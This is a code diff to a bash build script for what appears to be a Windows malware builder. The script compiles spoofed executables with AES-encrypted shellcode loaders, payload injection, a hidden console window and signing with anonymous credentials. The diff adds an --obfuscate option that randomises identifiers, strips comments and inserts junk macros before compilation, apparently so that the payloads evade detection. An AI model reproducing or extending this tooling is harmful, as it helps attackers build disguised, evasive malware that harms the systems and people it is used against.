@@ -19,6 +19,9 @@ ARCH="64"
 USE_LOADER_MODE=false
 SIGN_PAYLOAD=false
 IS_CPP=false
+OBFUSCATE=false
+OBF_SOURCE_RAW=""
+OBF_SOURCE_INJECT=""
 EXTRA_FILES=()
 
 show_help() {
@@ -32,6 +35,7 @@ show_help() {
   echo -e "  --output <name>     Output binary name (default: <type>.exe)"
   echo -e "  --add-file <file>   Add extra source file to the compilation"
   echo -e "  --sign              Sign the final executable using anonymous credentials"
+  echo -e "  --obfuscate         Obfuscate the code and variable names before compilation"
   echo -e "  --list              Show available spoof types"
   echo -e "  -h, --help          Show this help message"
   echo -e "---------------------------------------"
@@ -65,7 +69,43 @@ check_dependencies
 cleanup_aes() {
   echo -e "${BLUE}${PREFIX} Cleaning temporary AES files...${NC}"
   rm -f payload.enc key_iv.h "$AES_DIR"/payload_data.h /tmp/{raw_payload.exe,shellcode.o,raw_shellcode.bin}
+  [[ -f "$OBF_SOURCE_RAW" ]] && rm -f "$OBF_SOURCE_RAW"
+  [[ -f "$OBF_SOURCE_INJECT" ]] && rm -f "$OBF_SOURCE_INJECT"
 }
+
+obfuscate_code() {
+  echo -e "${BLUE}${PREFIX} Obfuscating source code...${NC}"
+  local file="$1"
+  local tmp_file="/tmp/obf_tmp_$(basename "$file")"
+
+  declare -A name_map
+  name_regex='[a-zA-Z_][a-zA-Z0-9_]{2,}'
+
+  while read -r word; do
+    [[ "$word" =~ ^(return|if|else|while|for|switch|case|break|int|char|void|unsigned|signed|sizeof|long|short|static|const|struct|include|define)$ ]] && continue
+    [[ "${#word}" -le 2 ]] && continue
+    if [[ -z "${name_map[$word]}" ]]; then
+      rand=$(tr -dc 'a-zA-Z' </dev/urandom | head -c 8)
+      name_map["$word"]="obf_$rand"
+    fi
+  done < <(grep -oP "$name_regex" "$file" | sort -u)
+
+  cp "$file" "$tmp_file"
+
+  for key in "${!name_map[@]}"; do
+    sed -i "s/\b$key\b/${name_map[$key]}/g" "$tmp_file"
+  done
+
+  sed -i 's/\/\/.*$//g' "$tmp_file"
+  sed -i '/^\s*$/d' "$tmp_file"
+
+  junk_macro="#define OBF_MACRO_$(tr -dc 'A-Z' </dev/urandom | head -c 5) (rand()%1337 + 42)"
+  sed -i "1s;^;$junk_macro\n;" "$tmp_file"
+
+  mv "$tmp_file" "$file"
+  echo -e "${GREEN}${PREFIX} Obfuscation complete: ${WHITE}$file${NC}"
+}
+
 
 sign_payload() {
   if ! command -v osslsigncode &>/dev/null; then
@@ -128,6 +168,10 @@ while [[ $# -gt 0 ]]; do
       INJECT_SOURCE="$2"
       USE_LOADER_MODE=true
       shift 2
+      ;;
+    --obfuscate)
+      OBFUSCATE=true
+      shift
       ;;
     --list)
       list_spoofers
@@ -294,6 +338,24 @@ done
 CMD+=("-mwindows")
 CMD+=("-s")
 CMD+=("-o" "$OUTPUT")
+
+if $OBFUSCATE && [[ -n "$SOURCE_FILE" && -f "$SOURCE_FILE" ]]; then
+  OBF_SOURCE_RAW="/tmp/obf_$(basename "$SOURCE_FILE")"
+  cp "$SOURCE_FILE" "$OBF_SOURCE_RAW"
+  SOURCE_FILE="$OBF_SOURCE_RAW"
+  obfuscate_code "$SOURCE_FILE"
+fi
+
+if $OBFUSCATE && [[ -n "$INJECT_SOURCE" && -f "$INJECT_SOURCE" ]]; then
+  EXT="${INJECT_SOURCE##*.}"
+  if [[ "$EXT" != "bin" ]]; then
+    OBF_SOURCE_INJECT="/tmp/obf_$(basename "$INJECT_SOURCE")"
+    cp "$INJECT_SOURCE" "$OBF_SOURCE_INJECT"
+    INJECT_SOURCE="$OBF_SOURCE_INJECT"
+    obfuscate_code "$INJECT_SOURCE"
+  fi
+fi
+
 
 echo -e "${BLUE}${PREFIX} Compiling payload (${ARCH}-bit, ${USE_LOADER_MODE:+AES Loader}: ${USE_LOADER_MODE:-Direct})...${NC}"
 if "${CMD[@]}"; then
